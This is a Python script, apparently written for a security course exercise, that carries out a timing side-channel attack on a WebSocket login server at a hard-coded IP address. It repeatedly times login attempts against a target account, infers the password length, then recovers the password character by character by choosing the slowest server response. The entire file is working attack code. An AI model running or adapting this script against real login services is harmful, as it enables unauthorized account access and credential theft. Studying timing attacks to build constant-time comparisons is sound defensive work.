import asyncio
import websockets
import time
import string
import statistics
from json import dumps, loads
from time import sleep

# --- SERVER CONNECTION LOGIC ---

async def client_connect(username, password, variance=0.003):
    """
    Asynchronously connects to the remote server via WebSockets.
    Sends the login credentials and returns the server's response.
    """
    server_address = "ws://20.224.193.77:8080"
    while True:
        try:
            async with websockets.connect(server_address) as websocket:
                # Send credentials as a JSON list
                await websocket.send(dumps([username, password, variance]))
                # Wait for the server to say if login was successful
                reply = await websocket.recv()
                return loads(reply)
        except Exception:
            # If connection fails (e.g., server busy), wait 1 second and try again
            await asyncio.sleep(1)

def call_server(username, password):
    """
    A wrapper function that runs the asynchronous connection in a 
    standard synchronous way. Includes a tiny delay to avoid 
    overloading the server.
    """
    reply = asyncio.run(client_connect(username, password))
    # Small sleep to respect server limits and avoid being blocked
    sleep(0.001) 
    return reply

# --- ATTACK LOGIC ---

# The list of all possible characters we will test (a-z and 0-9)
CHARSET = string.ascii_lowercase + string.digits 

def get_stable_time(student_number, password, samples=20):
    """
    Measures how many seconds the server takes to process a login attempt.
    To ignore 'lag' or network spikes, it tries (samples) times and takes the 
    median (middle) value as the most accurate measurement.
    """
    times = []
    for _ in range(samples):
        start = time.perf_counter()  # Start the stopwatch
        call_server(student_number, password)
        end = time.perf_counter()    # Stop the stopwatch
        times.append(end - start)
    
    # Return the most consistent time found
    return statistics.median(times)

def find_password_length(student_number):
    """
    Determines the password length by testing lengths 1 through 20.
    In many systems, checking a longer string takes slightly more time,
    or the server exits early if the length is wrong.
    """
    print("Step 1: Determining password length...")
    results = []
    
    for length in range(1, 21):
        # Create a dummy password of the current length (e.g., 'aaaaa')
        test_pw = "a" * length
        t = get_stable_time(student_number, test_pw, samples=20)
        results.append((t, length))
        print(f"  Length {length:02}: {t:.5f}s")
    
    # Sort results by time (descending). The length with the LONGEST 
    # response time is usually the correct one.
    results.sort(reverse=True)
    best_length = results[0][1]
    print(f">> Detected Length: {best_length}\n")
    return best_length

def crack_password(student_number):
    """
    The main attack loop. Once the length is known, it tests every 
    possible character for position 1, then position 2, and so on.
    """
    # First, find out how long the password is
    length = find_password_length(student_number)
    # Start with a baseline password (all 'a's)
    current_pw = list("a" * length)
    
    print(f"Step 2: Cracking characters for {student_number}...")
    
    for i in range(length):
        char_results = []
        # Try every character in our CHARSET (a, b, c... 8, 9)
        for char in CHARSET:
            current_pw[i] = char
            test_str = "".join(current_pw)
            t = get_stable_time(student_number, test_str, samples=20)
            char_results.append((t, char))
        
        # In a timing attack, the server compares the password character 
        # by character. If the first character is correct, it moves to 
        # the second, which takes a few microseconds LONGER.
        char_results.sort(reverse=True)
        best_char = char_results[0][1]
        
        # Lock in the 'slowest' character and move to the next position
        current_pw[i] = best_char
        print(f"  Pos {i}: '{best_char}' -> Current: {''.join(current_pw)}")
    
    final_password = "".join(current_pw)
    print(f"\n[SUCCESS] Cracked Password: {final_password}")
    return final_password

if __name__ == "__main__":
    # Start the process for the target account
    target_student = "000000" 
    crack_password(target_student)